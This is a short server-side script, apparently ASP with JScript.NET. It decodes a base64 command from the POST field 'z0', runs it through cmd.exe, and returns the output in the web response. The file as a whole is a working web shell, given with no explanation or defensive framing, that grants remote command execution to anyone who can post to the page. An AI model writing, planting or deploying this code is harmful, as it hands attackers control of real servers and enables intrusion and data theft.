<%

function getCurrentCharset() {
    var charset = this.Response.Charset;

    if (charset === "" || charset === undefined) {
        switch (this.Session.CodePage) {
            case 65001: charset = "utf-8"; break;
            case 1252:  charset = "windows-1252"; break;
            case 936:   charset = "gb2312"; break;
            case 950:   charset = "big5"; break;
            case 1251:  charset = "windows-1251"; break;
            default:    charset = "utf-8";
        }
    }

    return charset;
}

function base64Decode(str, encodingName) {
    if (!str || str == "") return "";

    var bytes = System.Convert.FromBase64String(str);

    var enc = encodingName
        ? System.Text.Encoding.GetEncoding(encodingName)
        : System.Text.Encoding.UTF8;

    return enc.GetString(bytes);
}

var szCommand = base64Decode(Request.Form["z0"]);
var szEncoding = base64Decode(Request.Form["z1"]);

if (szCommand !== "") {

    var psi = new System.Diagnostics.ProcessStartInfo("C:\\Windows\\System32\\cmd.exe");

    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardError = true;

    psi.Arguments = "/c " + szCommand;

    var proc = new System.Diagnostics.Process();
    proc.StartInfo = psi;

    proc.Start();

    var output = proc.StandardOutput.ReadToEnd();
    var error = proc.StandardError.ReadToEnd();

    proc.WaitForExit();

    Response.Write(output + error);
}

%>